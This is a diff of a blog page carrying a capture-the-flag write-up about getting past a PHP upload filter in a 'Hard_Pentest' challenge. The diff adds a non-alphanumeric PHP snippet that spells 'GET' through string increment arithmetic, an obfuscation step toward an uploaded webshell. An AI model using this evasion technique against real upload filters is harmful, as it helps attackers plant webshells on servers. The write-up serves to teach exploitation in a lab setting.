@@ -196,9 +196,13 @@ Unfortunately, because of that these problems required more time for me to solve
 </span><span class="lnt">10
 </span><span class="lnt">11
 </span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">function Check(){
+<pre class="chroma"><code class="language-php" data-lang="php">
+function Check(){
     $BlackExts = array(&#34;php&#34;);
     $ext = explode(&#34;.&#34;, $_FILES[&#34;file&#34;][&#34;name&#34;]);
     $exts = trim(end($ext));
@@ -210,6 +214,8 @@ Unfortunately, because of that these problems required more time for me to solve
           return true;
     }
     return false;
+
+
 </code></pre></td></tr></table>
 </div>
 </div><p>We can only upload php files, so maybe I can try to open a webshell here. The name, &ldquo;Hard_Pentest&rdquo; also gives me a hint that I should try to open a webshell. But the if statement blocks all alphanumerics and certain special characters from being processed. So, at first glance, anything we feed into this function won&rsquo;t be processed. But php is a <del>strange and weird</del> fascinating language with plenty of loopholes and different quirks about it, one of them, being the concept of &ldquo;<a href="https://www.php.net/manual/en/language.operators.increment.php">string/character arithmetic</a>&rdquo; (not the real term but I have no other informed way to describe it):</p>
@@ -283,22 +289,45 @@ A
 <p>What does this mean for us?</p>
 <p>Because of the <code>Check()</code> function, we can&rsquo;t use alphanumerics or certain special characters. But for the list of valid special characters, <code>[]</code> square brackets are allowed, so we can declare arrays as normal. And we can still declare variables as usual, and the <code>+</code> operators are still valid so we can utilize string arithmetic.</p>
 <p>So, all in all, if we wanted to spell the word <code>GET</code> with all the restrictions above, it would look like</p>
-<p>``php</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>``</p>
-<p>Armed with this knowledge, we can write out entire lines of code of php that are just a series of various shorthand operators and symbols, and string arithmetic.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$_</span><span class="o">=</span><span class="p">[]</span> <span class="cp">?&gt;</span>
+<span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$_</span><span class="o">=@</span><span class="s2">&#34;</span><span class="si">$_</span><span class="s2">&#34;</span> <span class="cp">?&gt;</span>
+<span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$_</span><span class="o">=</span><span class="nv">$_</span><span class="p">[</span><span class="s1">&#39;!&#39;</span><span class="o">==</span><span class="s1">&#39;@&#39;</span><span class="p">]</span> <span class="cp">?&gt;</span>
+<span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$___</span><span class="o">=</span><span class="nv">$_</span> <span class="cp">?&gt;</span>
+
+<span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$__</span> <span class="o">=</span> <span class="nv">$_</span> <span class="cp">?&gt;</span>
+<span class="cp">&lt;?</span><span class="o">=</span> <span class="o">@</span><span class="nv">$____</span> <span class="o">=</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="cp">?&gt;</span>   
+<span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$_______</span> <span class="o">=</span> <span class="nv">$__</span> <span class="cp">?&gt;</span>  \\G     
+
+<span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$__</span> <span class="o">=</span> <span class="nv">$_</span> <span class="cp">?&gt;</span>
+<span class="cp">&lt;?</span><span class="o">=</span> <span class="o">@</span><span class="nv">$____</span> <span class="o">=</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="cp">?&gt;</span>    \\E
+<span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$_______</span> <span class="o">.=</span> <span class="nv">$__</span> <span class="cp">?&gt;</span>
+
+<span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$__</span> <span class="o">=</span> <span class="nv">$_</span> <span class="cp">?&gt;</span>
+<span class="cp">&lt;?</span><span class="o">=</span> <span class="o">@</span><span class="nv">$____</span> <span class="o">=</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="o">+</span> <span class="nv">$__</span><span class="o">++</span> <span class="cp">?&gt;</span>   \\T
+<span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$_______</span> <span class="o">.=</span> <span class="nv">$__</span>  <span class="cp">?&gt;</span> \\GET
+</code></pre></td></tr></table>
+</div>
+</div><p>Armed with this knowledge, we can write out entire lines of code of php that are just a series of various shorthand operators and symbols, and string arithmetic.</p>
 <p>The first hurdle is the existence of the php opening tag. All php code requires the <code>&lt;?php</code> opening tag before anything, kinda like the start of any HTML document needing <code>&lt;HTML&gt;</code> to be declared first at the top.</p>
 <p>Checking out php open tags, we come across the existence of shorthand tags for them, in the <a href="https://www.php.net/manual/en/language.basic-syntax.phptags.php">PHP documentation</a>:</p>
 <blockquote>
